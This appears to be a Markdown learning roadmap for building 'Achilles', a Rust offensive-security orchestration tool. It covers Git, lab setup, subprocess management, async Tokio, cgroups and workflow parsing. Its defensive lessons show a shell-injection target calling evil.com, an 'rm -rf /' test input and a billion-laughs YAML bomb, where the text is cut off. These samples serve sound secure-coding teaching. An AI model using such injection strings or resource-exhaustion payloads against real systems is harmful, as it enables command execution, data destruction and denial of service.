# Achilles Learning Roadmap

> **Goal:** Learn every skill needed to build Project Achilles — the Offensive Security Orchestration Engine — from scratch. Not vibe-coded. Not copied. Every line yours.

> **Language:** Rust. The architecture document (§9.1) explains why. You learn Rust *by building Achilles*, not before it.

> **Realistic timeline:** Each "day" is a unit of 2-4 hours of focused work. Budget one unit per weekday evening, two per weekend day. At this pace, the roadmap takes approximately **4 months** of real calendar time. This is correct. A 2nd-year CS student building a production-quality Rust project alongside coursework should not expect to move faster. Do not rush phases to stay on a calendar. If a day takes two sessions, that is fine. If Phase 1 takes three weeks of calendar time, that is fine. The goal is depth, not speed.

---

### Critical Learning Rules

```
1. You build it. AI explains why. Never the reverse.
2. Every exercise must be done before moving to the next phase.
3. When something breaks, read the full error before asking for help.
   Form a hypothesis first.
4. The goal is not a working tool. The goal is understanding deep
   enough that you could rebuild it from scratch.
5. If you can't explain a design decision in one sentence, you don't
   understand it yet. Ask until you do.
6. Security tools must be held to a higher standard. Test every failure
   mode. Assume adversarial input.
```

### How to Use AI Effectively During This Roadmap

The rule is clear: AI explains concepts and answers *why* — it does NOT write code for you. But this rule is not operational unless you know how to ask well. A vague question gets a vague answer. A question that accidentally asks for code gets code. Here are concrete patterns for the three situations you will encounter every day:

**1. When you're stuck on a compiler error:**

```
BAD:  "Fix this error."
      → You learn nothing. The AI writes code. You copy-paste.
         Next time the same pattern appears, you're stuck again.

GOOD: "Here is the error and here is my code:
       [paste error]
       [paste relevant code]
       Explain what the borrow checker is detecting and why
       this is a problem. Do NOT show me the fixed code."
      → You understand the principle. You fix it yourself.
         Next time, you recognize the pattern.
```

**2. When you don't understand a design decision:**

```
BAD:  "How do I implement the nmap transformer?"
      → The AI writes the transformer. You've skipped the learning.

GOOD: "I've read §4.4 of the architecture doc. I understand that
       the transformer takes raw XML and produces Vec<Host>.
       What I don't understand is why the SourceInfo struct needs
       a node_id field — what downstream system uses that and
       what breaks if it's missing?"
      → You understand the architectural reason for a field.
         When you implement it, you know why it exists.
```

**3. When your code works but you're not sure it's right:**

```
BAD:  "Is this code correct?"
      → The AI says "yes" or rewrites it. Either way, you
         don't know what you missed.

GOOD: "Here is my scope enforcer implementation.
       [paste code]
       I want you to review it as a hostile security engineer —
       what inputs could bypass this check, and what edge cases
       am I not handling?"
      → You get adversarial feedback on YOUR code.
         You find bugs you didn't know existed.
```

**The goal of every AI interaction is to come out understanding something you didn't before. If you got an answer but couldn't explain it to someone else, ask again.**

---

## Phase 0: Git & GitHub (Days G1–G3)
*You don't build in a void. You build in a history. Git is that history.*

Git is not a tool you learn once and move on. It is the substrate that every professional software project runs on. Your commit history is evidence of how you think. A clean, well-described commit history tells an employer or a conference reviewer that you understand software development as a discipline, not just as code writing.

Do not skip this phase. Every professional you want to impress will look at your GitHub before they look at your code.

### Day G1 — Git Fundamentals: The Mental Model

Most people learn Git as a list of commands. This is wrong. Learn the mental model first — the commands become obvious once you understand what Git is actually tracking.

**Understand these three concepts before touching a command:**

| Zone | What it is | How data gets here |
|---|---|---|
| **Working directory** | The files you see and edit on disk | You edit them |
| **Staging area (index)** | A snapshot you are composing — not yet saved to history | `git add` |
| **Repository (.git)** | The permanent, compressed history of all snapshots | `git commit` |

```
git add    moves changes from working directory → staging area
git commit moves the staging area → repository (creates a permanent snapshot)
git status shows the state of all three zones at once
```

- [ ] Exercises — do each one, do not skip:
  - Create a new directory called `achilles-practice`. Run `git init`. Run `git status`. Read every line of the output — understand what each means.
  - Create a file called `main.rs` with any content. Run `git status`. Observe that Git sees it as "untracked". Run `git add main.rs`. Run `git status` again. The file moved to "staging". Run `git commit -m "Initial commit: add main.rs"`. Run `git log`. You have a history.
  - Edit `main.rs`. Run `git diff`. This shows what changed in your working directory vs the last commit. Run `git add -p` (patch mode) — this lets you stage specific lines within a file, not just the whole file. This is how professional commits are made: one logical change per commit, not "saved all my work today".
  - Create two more files. Stage one. Do not stage the other. Run `git status`. Observe the three-zone model in action: one file in staging, one file untracked.
  - Run `git log --oneline --graph`. This is your history view. Commit 5 more small changes with clear messages. Read the log after each one.

**Commit message discipline — learn this now, never unlearn it:**

```
BAD:  "fix stuff"
BAD:  "wip"
BAD:  "changes"

GOOD: "feat(scope): add CIDR range matching to scope enforcer"
GOOD: "fix(nmap): handle filtered ports in XML transformer"
GOOD: "test(adc): add snapshot tests for Host serialization"

Format: type(component): short description
Types:  feat / fix / test / docs / refactor / chore
```

Every commit message should complete the sentence: *"If applied, this commit will..."* [your message here]

- *Lesson: your commit history is a narrative. A reviewer reading your commits should understand the arc of your development — what you built, in what order, why each change was made. This is the difference between a portfolio and a dump of code.*

### Day G2 — Branching, Merging, and GitHub

Branches are not a complexity feature. They are how you work on something experimental without breaking what already works. Every feature, every fix, every experiment gets its own branch.

- [ ] Exercises:
  - Create a GitHub account if you don't have one. Create a new public repository called `achilles`. Do not initialize with README — you'll push your local repo.
  - `git remote add origin https://github.com/YOURUSERNAME/achilles.git` then `git push -u origin main`
  - Open your browser. Your commits are now visible to the world. This is your portfolio starting.
  - Create a branch: `git checkout -b phase-0-practice`. Make 3 commits. Push: `git push origin phase-0-practice`. Open a Pull Request on GitHub. Read the diff, the commits, the ability to comment on specific lines.
  - This is how professional code review works. Every feature you build on Achilles should go through this flow: branch → commits → PR → merge.
  - Merge the PR on GitHub. Pull locally: `git pull origin main`. Delete the branch: `git branch -d phase-0-practice`. Run `git log --oneline --graph`. Observe the merge commit.
  - **Simulate a conflict:** create a branch. Edit line 1 of `main.rs` on that branch. Also edit line 1 on `main`. Try to merge. Read the conflict markers (`<<<<`, `====`, `>>>>`). Resolve manually. Commit the resolution.
  - Conflicts are not errors. They are Git asking: "two people changed the same thing — which version do you want?"

### Day G3 — Rebase, History Rewriting, and Professional Workflow

This is the day most tutorials skip. It separates developers who use Git from developers who understand Git.

- [ ] Exercises:
  - **Rebase vs merge:** Merge creates a merge commit — preserves full history but adds noise. Rebase replays your commits on top of another branch — creates linear history. For a solo project, prefer rebase for a clean log.
  - `git checkout your-feature-branch` → `git rebase main` — commits replayed on top of main. No merge commit.
  - **Interactive rebase** — the most powerful Git command: `git rebase -i HEAD~5`
    - `pick` — keep the commit as-is
    - `squash` (s) — merge into previous commit
    - `reword` (r) — keep changes, rewrite the message
    - `drop` (d) — delete this commit
  - Use this to turn "wip", "fix", "fix again", "ok now it works" into a single clean commit before pushing.
  - **Fixing mistakes — every undo operation:**
    - `git commit --amend` — fix the last commit message or add forgotten files
    - `git reset --soft/--mixed/--hard HEAD~N` — move HEAD backwards (three modes: keep staged, keep unstaged, or destroy)
    - `git revert <hash>` — undo a public/pushed commit by creating a new revert commit
    - `git restore --staged file` — unstage a file without losing changes
    - `git restore file` — discard uncommitted changes in a file
    - `git stash` / `git stash pop` — temporarily park and restore work-in-progress
    - `git reflog` — Git's flight recorder, recover "lost" commits after destructive operations
  - **Create `.gitignore`** for the Achilles project:
    ```
    /target          # Rust build output — never commit
    *.enc            # Encrypted vault files — never commit secrets
    *.log            # Audit logs — never commit run artifacts
    .env             # Environment variables — never commit secrets
    achilles.db      # SQLite state — never commit runtime data
    ```
  - **Tagging releases:** `git tag -a v0.1.0 -m "Initial release"` → `git push origin v0.1.0`

**The Git workflow for every Achilles feature from Day 1 onward:**

```
1. git checkout -b phase-1/subprocess-runner
2. Write code. Commit frequently with clear messages.
3. When feature works: git rebase -i to clean up WIP commits
4. git push origin phase-1/subprocess-runner
5. Open a PR on GitHub (even solo — it creates a record)
6. Review your own diff. Would a stranger understand this change?
7. Merge. Delete the branch. Pull main.

Branch naming: phase-N/short-description
Examples: phase-1/nmap-subprocess, phase-2/adc-host-struct, phase-4/dag-builder
```

- *Lesson: your GitHub profile is your resume. Employers, conference reviewers, and open-source contributors will look at your commit history, your branch structure, your PR descriptions, and your CI status before they look at your code. A clean, well-structured repository signals that you understand software development as a collaborative, disciplined practice — not just as writing code that runs.*

---

## Phase 0b: Lab Environment Setup (1 Day)
*You cannot learn offensive security tools on systems you don't own. Set up your lab before writing a single line of Rust.*

- [ ] **Install Rust:**
  - `curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`
  - Verify: `rustc --version`, `cargo --version`
  - Install `cargo-watch` for auto-rebuild: `cargo install cargo-watch`

- [ ] **Install security tools:**
  - On Kali/Parrot (recommended): `sudo apt install nmap` — most tools pre-installed
  - On other Linux: install individually: `nmap`, `subfinder`, `httpx`, `nuclei`, `ffuf`
  - For Go-based tools (subfinder, httpx, nuclei, ffuf): `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` (repeat for each)
  - Verify each: `nmap --version`, `subfinder -version`, `httpx -version`, `nuclei -version`, `ffuf -version`
  - **Understand privileges:** nmap SYN scans (`-sS`) require root. TCP connect scans (`-sT`) do not. Know the difference before Day 3.

- [ ] **Set up a legal target environment:**
  - **Option A (recommended):** Create a [HackTheBox](https://hackthebox.com) or [TryHackMe](https://tryhackme.com) account. Use their dedicated machines as targets. These are legal, isolated, and purpose-built for testing.
  - **Option B:** Spin up a local Vulnhub VM: download a vulnerable VM (e.g., Metasploitable 2), run it in VirtualBox on an isolated host-only network.
  - **Option C:** Use Docker: `docker run -d -p 80:80 vulnerables/web-dvwa` for a local vulnerable web app
  - `scanme.nmap.org` is available for basic nmap testing ONLY — do not run nuclei, ffuf, or sqlmap against it.
  - **The rule, stated once, followed always:** Never scan targets you do not own or have explicit written authorization to scan. This is not a suggestion. It is the law (Computer Fraud and Abuse Act, Computer Misuse Act, or your jurisdiction's equivalent).

- *Lesson: professional pentesters set up lab environments before every engagement. Tool installation, target availability, and permission verification happen before a single packet is sent. Build this discipline now.*

---

> [!IMPORTANT]
> **Fresh repository for Phase 1:** The `achilles-practice` directory and GitHub repo from Phase 0 are for learning Git — they contain placeholder files, not a real Rust project. Before starting Day 1 below, create a **new, proper Rust project:**
> 1. Rename or archive the Phase 0 practice repo on GitHub (e.g., `achilles-git-practice`)
> 2. `cargo init achilles && cd achilles && git init`
> 3. Create a new `achilles` repository on GitHub and push
> 4. This is the real Achilles repository — all code from Day 1 onward lives here

## Phase 1: Rust & Systems Foundations (Days 1-6)
*You can't build an engine that manages subprocesses if you don't understand how your OS runs them. And you can't write safe Rust if you haven't internalized the borrow checker.*

### Days 1-2 — Ownership, Borrowing, and the Borrow Checker

These two days are dedicated entirely to Rust's ownership model. Do **not** skip ahead to subprocesses. The borrow checker must click first.

- [ ] Day 1 — Variables, ownership, moves, and the stack vs heap
  - Install Rustlings: `cargo install rustlings` → `rustlings init` → `cd rustlings`
  - Complete **all** exercises through `move_semantics` (variables, functions, if, primitive types, vecs, move semantics)
  - After each exercise, write one sentence explaining what the compiler was preventing and why
  - Write a program that creates a `String`, passes it to a function, and then tries to use it after the function call. Read the compiler error. Understand: the value was *moved*, not *copied*. The function now owns it.
  - *Lesson: Rust's ownership system eliminates use-after-free, double-free, and data races — at compile time. Python has none of these guarantees. This is why Achilles's engine (which manages concurrent subprocess I/O) must be Rust, not Python. See §9.1.*

- [ ] Day 2 — Borrowing, references, lifetimes (basics), `String` vs `&str`, `Result<T, E>`, `?` operator
  - Complete Rustlings through `error_handling`
  - Write a function with this signature: `fn count_words(text: &str) -> HashMap<String, usize>`. The `&str` is a *borrow* — the function reads the text without taking ownership. Write it. Test it.
  - Write a function: `fn read_file(path: &str) -> Result<String, std::io::Error>` using `std::fs::read_to_string`. Use the `?` operator to propagate errors. Call it with a file that exists and one that doesn't.
  - Serialize the word count `HashMap` to JSON using `serde_json`. Deserialize it back. Assert the round-trip is lossless.
  - *Lesson: Rust forces you to handle errors at compile time. Python lets you ship a program that crashes at 3 AM. The `Result` type is not a nuisance — it is a guarantee that every error path is handled.*

### Days 3-4 — Subprocess Management

- [ ] Day 3 — `std::process::Command`, capturing stdout/stderr, exit codes
  - Write a Rust program that runs `nmap -sV -p 80,443 <target>` as a subprocess (use your lab target from Phase 0b)
  - Capture stdout and stderr into separate `String`s
  - Check the exit code: if non-zero, return an `Err` with the stderr contents
  - Print the raw stdout to the terminal
  - **This is the atomic unit of Achilles.** Every tool node does exactly this: run a command, capture its output, check for failure.
  - **CRITICAL: Shell injection prevention.** Your code MUST use the direct argument API:
    ```rust
    // CORRECT — each argument is a separate .arg() call.
    // The target is never interpreted by a shell.
    Command::new("nmap")
        .arg("-sV")
        .arg("-p")
        .arg("80,443")
        .arg(target)   // target is passed directly to execvp
        .output()
    ```
    ```rust
    // WRONG — NEVER DO THIS. This passes the string through sh.
    // If target = "10.0.0.1; curl evil.com", the shell executes
    // both nmap AND curl.
    Command::new("sh")
        .arg("-c")
        .arg(format!("nmap -sV -p 80,443 {}", target))
        .output()
    ```
    Rust's `std::process::Command` does NOT use a shell by default — `Command::new("nmap").arg(target)` passes the target directly to the OS via `execvp`. The target string is never interpreted by `sh`/`bash`. This is the single most important security property of the subprocess runner. If you ever construct a format string and pass it through a shell, you create the exact vulnerability the architecture document warns against (§7.3, I-10).
  - **Rule for all of Achilles, stated once, followed always:** The subprocess runner API accepts `(binary: &str, args: &[&str])`. No shell mode. No format strings. Every argument is a separate `.arg()` call.
  - **CRITICAL: Always close stdin.** Every `Command` spawn must include `.stdin(Stdio::null())`. Without it, tools that optionally read from stdin (nuclei, ffuf) will block indefinitely waiting for input that never arrives:
    ```rust
    use std::process::Stdio;

    Command::new("nmap")
        .arg("-sV").arg(target)
        .stdin(Stdio::null())      // CRITICAL: signal EOF immediately
        .stdout(Stdio::piped())    // Capture output
        .stderr(Stdio::piped())    // Capture errors
        .output()
    ```
    The pipe is left open by default. The tool cannot distinguish "no input yet" from "input coming later" — so it waits forever. `Stdio::null()` closes stdin immediately, signaling EOF. This is not optional. Every subprocess in Achilles uses this pattern.

- [ ] Day 4 — Timeout and failure handling
  - Add a configurable timeout (use `std::time::Duration` and spawn a thread that kills the child process after N seconds)
  - Test three deliberate failures:
    - Try to run a binary that doesn't exist (`Command::new("nonexistent_tool")`) — handle the error
    - Run `nmap` against a filtered host with a 5-second timeout — handle the timeout
    - Try to run nmap without adequate privileges for SYN scan (if applicable) — handle the permission error
  - For each: read the **full error**, handle it with a descriptive message
  - *Lesson: every tool node in Achilles must handle all three failure modes. If it can't run the tool, it says why. If the tool hangs, it kills it. If the tool crashes, it reports what happened. This is §5.5 (Error Handling).*

### Day 4b — Deliberate break exercise: Make everything fail

- [ ] Provoke every error path in your Day 3-4 code:
  - Pass an empty string as the target — what happens?
  - Pass a target with special characters (`; rm -rf /`) — does your code sanitize it, or does it pass it to nmap's shell? **If you used `Command::new("nmap").arg(target)` correctly, the semicolon is passed as a literal argument to nmap — nmap sees it as a hostname and fails with a DNS error. No shell interprets it. This is the correct behavior.** If your code used `format!()` and a shell, the semicolons are interpreted. Go back and fix it.
  - Set the timeout to 0ms — does it panic or return an error?
  - Kill the child process mid-execution (Ctrl+C) — does your program hang or clean up?
  - Write one sentence for each failure: *why* it failed, *how your code handles it*
  - *Lesson: Achilles runs commands on behalf of a pentester. If the pentester's input can break the engine, the engine is the vulnerability. Never trust user input — not even from your own workflow files.*

### Days 5-6 — Rust deepening: Enums, Traits, Generics, Collections

- [ ] Day 5 — Enums (tagged unions), pattern matching, traits
  - Complete Rustlings through `traits`
  - Define a `ToolResult` enum: `Success { stdout: String, duration: Duration }` | `Failure { stderr: String, exit_code: i32 }` | `Timeout { elapsed: Duration }`
  - Write a function that returns `ToolResult` and use `match` to handle all three variants. The compiler forces you to handle every case — this is exhaustive pattern matching, and it's why Rust's type system is superior to Go's for the ADC.
  - Define a trait: `trait Executable { fn run(&self) -> Result<ToolResult, ToolError>; }`. Implement it for a `NmapRunner` struct.
  - **Design note for later — read now, internalize for Phase 7:** The Node trait (§6.1) returns a `Vec<ADCObject>`, where `ADCObject` is an enum: `Host(Host) | Finding(Finding) | Port(Port) | ...`. This is deliberately NOT `Vec<Box<dyn ADCType>>` (trait object). Why: trait objects in Rust require object-safety, which means no generics in trait methods, no `Self` in return types. This creates real friction. The enum approach gives exhaustive `match` checking — the compiler tells you when a new ADC type is added but not handled in a node. The tradeoff is that adding a new ADC type requires adding an enum variant, but this is preferable to `dyn Any` with runtime downcasting.
  - *Lesson: the `Node` trait (§6.1) follows exactly this pattern. Every tool node implements the same interface. The engine doesn't know whether it's running nmap or nuclei — it only knows: "this thing implements `Node` and returns ADC objects." Traits make this possible.*

- [ ] Day 6 — `Vec`, `HashMap`, iterators, closures, `Option<T>`
  - Complete Rustlings through `iterators`
  - Write a function that takes `Vec<String>` (a list of hostnames), filters out duplicates, sorts alphabetically, and returns `Vec<String>`. Use iterator methods (`.iter()`, `.filter()`, `.map()`, `.collect()`), not manual loops.
  - Write a function that takes `Vec<Host>` (preview of your ADC type) and groups them by IP address into a `HashMap<String, Vec<Host>>`. This is the kind of data transformation the merge node (§6.3) does.
  - *Lesson: Rust's iterator combinators replace Python's list comprehensions. They are zero-cost — the compiler optimizes them to the same machine code as a hand-written loop. Learn to think in iterators; the transformers in Phase 2 will rely on them heavily.*

- [ ] **Tooling habit — start now, never stop:**
  - Run `cargo clippy` on your project. Read every warning. Clippy is not just a linter — it teaches idiomatic Rust. It will catch: `.unwrap()` where `?` belongs, unnecessary `.clone()`, suboptimal iterator chains, missing error variant handling, and dozens of other patterns.
  - Run `cargo fmt`. This auto-formats your code to the community standard. No arguments about style.
  - Add both to your workflow: **fix clippy warnings and run `cargo fmt` before every commit.** If you wait until Day 36 (CI setup) to run clippy for the first time on 8,000 lines, you'll have hundreds of warnings. Fix them as you go — 2 warnings per commit is easy, 200 warnings on release day is painful.

---

## Phase 2: Data Modeling & the Achilles Data Contract (Days 7-9)
*The Achilles Data Contract is the architectural heart of this project. If the schema is wrong, everything built on top is wrong.*

- [ ] Day 7 — Define the ADC types in Rust
  - Read §4 of the architecture document carefully. Understand *why* each type exists.
  - Define these structs with `#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]`:
    - `Host` (id, ip_addresses, hostnames, ports, source)
    - `Port` (number, protocol, state, service)
    - `Service` (name, product, version)
    - `URL` (full, scheme, host, port, path, query, response, technologies)
    - `Finding` (id, title, severity, host_ref, cve, cwe, cvss, evidence)
    - `Credential` (id, username, plaintext_password, password_hash, source, host_ref)
      - `plaintext_password: Option<String>` — populated only when sqlmap extracts a plaintext value; never logged, never in reports without explicit approval — see §7.5
    - `DNSRecord` (hostname, record_type, value, ttl)
  - Use Rust enums for `Severity` (`Info`, `Low`, `Medium`, `High`, `Critical`), `Protocol` (`TCP`, `UDP`), `PortState` (`Open`, `Closed`, `Filtered`)
  - Write unit tests: create a `Host` with 3 ports, serialize to JSON, deserialize back, assert equality
  - *Lesson: these types are the contract between every tool in the pipeline. If nmap says "port 80 is open" and nuclei says "port 80 has a vulnerability", these types are how they agree on what "port 80" means. This is §4.1.*

- [ ] Day 8 — JSON Schema validation + nmap transformer
  - Add the `jsonschema` crate. Write a JSON Schema (by hand, in a `.json` file) describing your `Host` type: required fields, types, constraints (port number 1-65535, severity must be enum value)
  - Write a validation function: `fn validate_host(json: &str) -> Result<(), Vec<ValidationError>>`
  - Test: valid data passes, invalid data (port = -1, severity = "banana") fails with clear messages
  - Add the `quick-xml` crate. Write: `fn transform_nmap(xml: &str) -> Result<Vec<Host>, TransformError>`
  - Parse real nmap XML output (from your lab scans) into `Host` structs
  - Handle: multiple hosts, ports with no service, hosts with no open ports, filtered ports
  - *Lesson: the transformer is the glue between the real world (messy XML) and the ideal world (typed ADC objects). Every bug in a transformer is a bug in every workflow that uses that tool.*

### Day 8b — Calibrate your transformer against 5 real scans

- [ ] Run 5 nmap scans against different target types in your lab:
  1. A target with many open ports
  2. A target with all ports filtered (a firewall)
  3. A UDP scan (`-sU`)
  4. A scan with OS detection (`-O`)
  5. A scan with service version detection (`-sV`)
  - Save raw XML from each (`-oX`). Run each through your transformer. Does it break on UDP? On no open ports? On OS detection fields? Fix every edge case.
  - Write a snapshot test (using the `insta` crate) for each scan: given this exact XML, assert this exact ADC JSON output.
  - *Lesson: a schema designed without looking at real data is fiction. The ADC must be grounded in the actual output of actual tools. This is why §4.3 (Tool → ADC Mapping) exists.*

- [ ] Day 9 — Httpx transformer + subfinder transformer
  - Subfinder transformer: parse newline-delimited domains → `Vec<Host>` (hostnames only, no IPs yet). Simple — but still validate output against schema.
  - Httpx transformer: parse JSONL output → `Vec<URL>` with `HTTPResponse` fields (status_code, title, content_type, technologies). Handle: targets that don't respond, non-HTTP services, redirect chains.
  - Validate every output object against your JSON Schema.
  - Run the transformers against real tool output from your lab.
  - *Lesson: three transformers done. The pattern is established: run tool → capture output → parse format → map to ADC types → validate schema. Every future transformer follows this pattern. This is §4.4 (Transformer Architecture).*

---

## Phase 3: Process Orchestration & Async Rust (Days 10-12)
*Running subfinder then nmap then nuclei in sequence is trivial. Running them in the right order with the right data at the right time is the whole problem.*

- [ ] Day 10 — Tokio basics: async/await, spawning tasks, channels
  - Add `tokio` with `full` features
  - Rewrite your subprocess runner as async: `async fn run_tool(cmd: &str, args: &[&str]) -> Result<ToolOutput, ToolError>` using `tokio::process::Command`
  - **CRITICAL: From this point forward, ALL subprocess execution in Achilles uses `tokio::process::Command`, NOT `std::process::Command`.** The synchronous version blocks the calling thread. In an async context (the entire engine), blocking a Tokio thread means blocking other tasks scheduled on that thread. If you run 10 nodes in parallel and one calls `std::process::Command::new("nmap").output()` (synchronous), that thread is blocked for the entire nmap scan duration — and any other task scheduled on that thread stalls silently. `tokio::process::Command` yields to the runtime while waiting, allowing other tasks to proceed. Delete your Day 3 synchronous subprocess runner. Replace it. Keep the argument API the same (`(binary, args)` — no shell), but swap the underlying implementation.
  - Run two commands in parallel with `tokio::join!` — observe actual concurrency
  - Run two in sequence with `.await` — observe the second waits for the first
  - *Lesson: Achilles's DAG scheduler (§5.3) runs independent nodes in parallel and dependent nodes in sequence. Tokio is how. If node B depends on A, B `.await`s A. If B and C are independent, they `join!`.*

- [ ] Day 11 — Build a 3-node pipeline: subfinder → httpx → nmap
  - Entirely in Rust. No framework. Hard-coded pipeline.
  - Step 1: Run subfinder. Parse output → `Vec<Host>` (using Day 9 transformer).
  - Step 2: Feed hostnames to httpx. Parse → `Vec<URL>` (Day 9 transformer).
  - Step 3: Feed hostnames to nmap. Parse XML → `Vec<Host>` enriched with ports (Day 8 transformer).
  - **Every transition goes through ADC types.** No raw text passing between tools.
  - Run against a real lab target. Does it work end-to-end?
  - *Lesson: this is the proof-of-concept of the entire Achilles thesis. If you can run 3 tools with typed data flowing between them, you can run 30. The architecture scales because the data contract is fixed.*

### Day 11b — Conceptual insert: Directed Acyclic Graphs

> *(20 minutes — read and think, no code)*
>
> Your Day 11 pipeline is a **chain**: A → B → C. But real workflows are **graphs**.
>
> ```
>     subfinder
>        ↓
>      httpx
>      ↓   ↓
>   nuclei   ffuf
>      ↓   ↓
>     merge
>       ↓
>     report
> ```
>
> `nuclei` and `ffuf` don't depend on each other — they both depend on `httpx`. They run **in parallel**. But `merge` depends on both — it **waits** for both to finish.
>
> This is a **Directed Acyclic Graph (DAG)**. "Directed" = data flows one way. "Acyclic" = no loops (if A depends on B and B depends on A, the workflow is invalid).
>
> The **topological sort** gives a valid execution order: every node runs only after all dependencies complete. Multiple valid orderings exist — the scheduler picks one maximizing parallelism.
>
> This is §5.2. Add the `petgraph` crate. Create the above workflow as a `DiGraph`. Print its topological sort. Confirm nuclei and ffuf both appear after httpx but their relative order doesn't matter.

- [ ] Day 12 — Parallel DAG execution
  - Extend Day 11: subfinder → httpx → [nuclei, ffuf] (parallel) → merge
  - Use `tokio::join!` for the parallel branch
  - Implement a simple merge combining `Vec<Finding>` from nuclei with `Vec<URL>` from ffuf
  - Add timing: print per-node duration and total. Total should be less than sum (parallel overlap).
  - **Concurrency limiter:** The workflow config says `max_parallel: 10`. Implement this using `tokio::sync::Semaphore`:
    ```rust
    use tokio::sync::Semaphore;
    use std::sync::Arc;

    let semaphore = Arc::new(Semaphore::new(max_parallel));  // e.g., 10

    // Before spawning each node:
    let permit = semaphore.clone().acquire_owned().await.unwrap();
    tokio::spawn(async move {
        let result = execute_node(node).await;
        drop(permit);  // Release when done — next waiting node can proceed
        result
    });
    ```
    Without a semaphore, `tokio::spawn` will happily launch 500 nodes simultaneously, leading to the file descriptor exhaustion you'll observe in Day 12b. The semaphore is the production solution. Implement it now; Day 12b will show you why it's necessary.
  - *Lesson: the parallel speedup is the reason Achilles uses DAG scheduling. For 500 subdomains, this is hours vs. minutes. This is §5.3.*

### Day 12b — Deliberate Break: Async Rust Failure Modes

Async Rust has non-obvious failure modes that will appear during engine development. If you don't provoke them now in a controlled setting, you'll encounter them at 2 AM during a real workflow run and have no idea what's happening.

- [ ] Four failures you must provoke and understand:

  1. **A Tokio task that panics:**
     - Spawn a task with `tokio::task::spawn` that calls `panic!("intentional")`. Await the `JoinHandle`.
     - Observe: the task returns `Err(JoinError)` — the runtime does **not** crash. The panic is caught and converted to an error.
     - Implication for the engine: if a node panics during execution (e.g., malformed XML causes an unwrap), the engine survives. But you **must** check the `JoinHandle` result explicitly — if you ignore it, the failure is silent.

  2. **A `tokio::join!` where one future blocks indefinitely:**
     - Write two futures: one completes in 1 second, one loops forever.
     - `tokio::join!` waits for both — the fast one completes, but join! never returns because it's waiting for the infinite one.
     - Now wrap both with `tokio::time::timeout(Duration::from_secs(5), future)`. Observe: the infinite future times out, the join completes.
     - Implication for the engine: every node execution must be wrapped in a timeout. Without it, a hanging nmap process (e.g., scanning a firewalled host with no timeout flag) will freeze the entire workflow.

  3. **Dropping a channel sender while a receiver awaits:**
     - Create a `tokio::sync::mpsc::channel`. Spawn a task that sends one message then drops the sender. In another task, loop over `receiver.recv()`. After the sender drops, `recv()` returns `None`.
     - Implication for the engine: when the DAG scheduler uses channels to pass ADC objects between nodes, a failing node may drop its sender. The downstream node must handle `None` (channel closed) as "upstream failed," not "no more data" vs "task completed normally." These are different conditions.

  4. **Spawning 500 concurrent tasks all doing subprocess I/O:**
     - Write a loop that spawns 500 `tokio::task::spawn` tasks, each running `tokio::process::Command::new("echo").arg("hello")`. Await all.
     - On most systems: this works. But increase to 5,000 with a real tool (nmap) and observe: file descriptor exhaustion is possible ("Too many open files"). Add `ulimit -n` check.
     - Implication for the engine: the DAG scheduler needs a **concurrency limiter** (semaphore). `max_parallel: 10` in the workflow config must actually limit concurrent subprocess spawns, not just task spawns.

- [ ] For each failure, write one sentence:
  - What broke
  - What the engine must do to handle it correctly

- *Lesson: async bugs don't crash loudly. They hang silently. The DAG scheduler must treat every `.await` as a potential hang and every spawned task as a potential panic. Timeouts and `JoinHandle` error handling are not optional in production async code.*

### Day 12c — Linux cgroups v2 for Resource Limits

You now have a semaphore limiting concurrent tasks and timeouts preventing infinite hangs. But neither controls **memory** or **CPU** at the OS level. A malicious or buggy tool can allocate 16 GB of RAM and OOM-kill your entire system, or spin all CPU cores at 100% and make the machine unresponsive. The architecture document (§3.12, I-06) specifies per-node resource limits enforced by Linux cgroups v2 — the same isolation mechanism Docker uses.

Do not wait until Phase 6 (security hardening) to learn this. The moment you spawn concurrent subprocesses that process untrusted input (which is now, Day 12), you need OS-level resource containment.

- [ ] Exercises:
  - Add the `cgroups-rs` crate to your project
  - Create a cgroup for a subprocess:
    ```rust
    use cgroups_rs::{Cgroup, CgroupPid};
    use cgroups_rs::memory::MemController;
    use cgroups_rs::cpu::CpuController;

    // Create a cgroup for this node execution
    let cg = Cgroup::new("achilles/node_nmap_001")?;

    // Memory limit: 512 MB
    let mem = cg.controller_of::<MemController>().unwrap();
    mem.set_limit(512 * 1024 * 1024)?;  // 512 MB

    // CPU limit: 50% of one core
    let cpu = cg.controller_of::<CpuController>().unwrap();
    cpu.set_cfs_quota(50_000)?;   // 50ms out of 100ms period
    cpu.set_cfs_period(100_000)?; // 100ms period

    // Spawn the subprocess
    let child = Command::new("nmap").arg("-sV").arg(target).spawn()?;

    // Move the subprocess into the cgroup
    cg.add_task(CgroupPid::from(child.id() as u64))?;
    ```
  - Test: write a program that allocates memory in a loop. Run it inside a cgroup with a 64 MB limit. Observe: the kernel kills it (OOM) when it exceeds the limit. Your engine process survives.
  - Test: write a CPU spinner (`loop {}`). Run it in a cgroup with 10% CPU quota. Observe: it runs at 10% CPU, not 100%. Other tasks proceed normally.
  - Integrate this into your subprocess runner: every `tokio::process::Command` execution wraps the child process in a cgroup with configurable limits from the workflow YAML.
  - **Note:** cgroups v2 requires root or a user with `cgroupfs` write access. In your lab environment, run Achilles with `sudo` for now. In production, the engine would be configured with appropriate cgroup delegation (`systemd-run --scope` or similar).
  - *Lesson: the semaphore limits HOW MANY subprocesses run. The timeout limits HOW LONG they run. cgroups limits HOW MUCH MEMORY AND CPU they consume. All three are required for safe concurrent subprocess management. Missing any one creates a denial-of-service vector.*

---

## Phase 4: Workflow Engine (Days 13-16)
*This is the engine. Everything else plugs into it.*

- [ ] Day 13 — YAML parsing and workflow file format
  - Add `serde_yaml`. Study §8.2 workflow format.
  - Define: `Workflow { name, scope, nodes }`, `WorkflowNode { name, tool, depends_on, config, input, output, on_error }`
  - Write: `fn parse_workflow(yaml: &str) -> Result<Workflow, ParseError>`
  - Parse the §8.2 example. Test with invalid YAML (missing `name`, empty `nodes`, wrong types).
  - **CRITICAL: YAML bomb prevention.** Community workflows are untrusted YAML files. A malicious workflow can exploit YAML anchors and aliases to perform a billion-laughs attack:
    ```yaml
    # Billion-laughs YAML bomb — exponential expansion
    a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
    b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
    c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
    d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
    e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
